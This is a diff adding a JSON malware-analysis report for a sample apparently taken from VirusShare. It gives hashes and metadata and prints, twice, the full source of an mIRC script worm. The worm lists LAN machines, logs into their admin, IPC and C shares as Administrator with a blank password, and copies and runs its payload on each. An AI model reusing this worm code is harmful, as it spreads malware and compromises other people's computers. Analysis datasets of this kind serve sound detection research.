@@ -1,0 +1,74 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command",
+            "write": "May write to a file"
+        },
+        "macro": "alias xspread { \n  .write x-.bat net view > x-.txt \n  .write x-.bat del x-.bat \n  run system32.exe /n /fh /r \"x-.bat\" \n  xcopy1 \n  .timersxcopy 1 20 xcopy1\n}\nalias xcopy1 {\n  if ($lines(x-.txt) < 6) || ($exists(x-.txt) == $false) { talk Special Lan Spread found no internal computers.. | halt } \n  .write -dl1 x-.txt \n  .write -dl1 x-.txt \n  .write -dl1 x-.txt \n  .write -dl $+ $lines(x-.txt) x-.txt\n  .write -dl $+ $lines(x-.txt) x-.txt \n  talk Special Lan Spread Found: $lines(x-.txt) Within Local Area Network. \n  xcopy2\n}\nalias xcopy2 {\n  if ($lines(x-.txt) == 0) { talk Special Lan Spreading Is Finished... | unset %xcopy.* | .remove x-.txt | halt } \n  set %xcopy.pc $gettok($read(x-.txt,1),1,32) \n  set %xc0py nav.exe \n  .write x-.bat @echo off \n  .write x-.bat net use %xcopy.pc $+ \\$admin \"\" /user:\"Administrator\" \n  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf \n  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o \n  .write x-.bat %xc0py %xcopy.pc -d %sf -o \n  .write x-.bat net use %xcopy.pc $+ \\$ipc \"\" /user:\"Administrator\" \n  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf \n  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o \n  .write x-.bat %xc0py %xcopy.pc -d %sf -o \n  .write x-.bat net use %xcopy.pc $+ \\$c \"\" /user:\"Administrator\" \n  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf \n  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o \n  .write x-.bat %xc0py %xcopy.pc -d %sf -o \n  .write x-.bat del x-.bat \n  run system32.exe /n /fh /r \"x-.bat\" \n  talk Attempting To Root: %xcopy.pc , Computers Left: $calc($lines(xcopy.txt) - 1) \n  .write -dl1 x-.txt \n  xcopy2 \n .timerxcopy 1 6 xcopy2\n }"
+    },
+    "filename": "VirusShare_3186148b75741684160fc87109855661",
+    "filesize": 1649,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3186148b75741684160fc87109855661",
+        "sha1": "ac968d439d2a42f1e5a1caffa34057dfacba1291",
+        "sha256": "40d0ed4c326f28d3bae151fb5769e2f01fab047ce3e692bb67693f338975b2dc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "alias xspread { ",
+            "  .write x-.bat net view > x-.txt ",
+            "  .write x-.bat del x-.bat ",
+            "  run system32.exe /n /fh /r \"x-.bat\" ",
+            "  xcopy1 ",
+            "  .timersxcopy 1 20 xcopy1",
+            "alias xcopy1 {",
+            "  if ($lines(x-.txt) < 6) || ($exists(x-.txt) == $false) { talk Special Lan Spread found no internal computers.. | halt } ",
+            "  .write -dl1 x-.txt ",
+            "  .write -dl1 x-.txt ",
+            "  .write -dl1 x-.txt ",
+            "  .write -dl $+ $lines(x-.txt) x-.txt",
+            "  .write -dl $+ $lines(x-.txt) x-.txt ",
+            "  talk Special Lan Spread Found: $lines(x-.txt) Within Local Area Network. ",
+            "  xcopy2",
+            "alias xcopy2 {",
+            "  if ($lines(x-.txt) == 0) { talk Special Lan Spreading Is Finished... | unset %xcopy.* | .remove x-.txt | halt } ",
+            "  set %xcopy.pc $gettok($read(x-.txt,1),1,32) ",
+            "  set %xc0py nav.exe ",
+            "  .write x-.bat @echo off ",
+            "  .write x-.bat net use %xcopy.pc $+ \\$admin \"\" /user:\"Administrator\" ",
+            "  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf ",
+            "  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o ",
+            "  .write x-.bat %xc0py %xcopy.pc -d %sf -o ",
+            "  .write x-.bat net use %xcopy.pc $+ \\$ipc \"\" /user:\"Administrator\" ",
+            "  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf ",
+            "  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o ",
+            "  .write x-.bat %xc0py %xcopy.pc -d %sf -o ",
+            "  .write x-.bat net use %xcopy.pc $+ \\$c \"\" /user:\"Administrator\" ",
+            "  .write x-.bat %xc0py %xcopy.pc attrib.exe -r %sf ",
+            "  .write x-.bat %xc0py %xcopy.pc -f -c -d %sf -o ",
+            "  .write x-.bat %xc0py %xcopy.pc -d %sf -o ",
+            "  .write x-.bat del x-.bat ",
+            "  run system32.exe /n /fh /r \"x-.bat\" ",
+            "  talk Attempting To Root: %xcopy.pc , Computers Left: $calc($lines(xcopy.txt) - 1) ",
+            "  .write -dl1 x-.txt ",
+            "  xcopy2 ",
+            " .timerxcopy 1 6 xcopy2"
+        ],
+        "file": {
+            "  .write -dl $+ $lines(x-.txt) x-.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274829",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
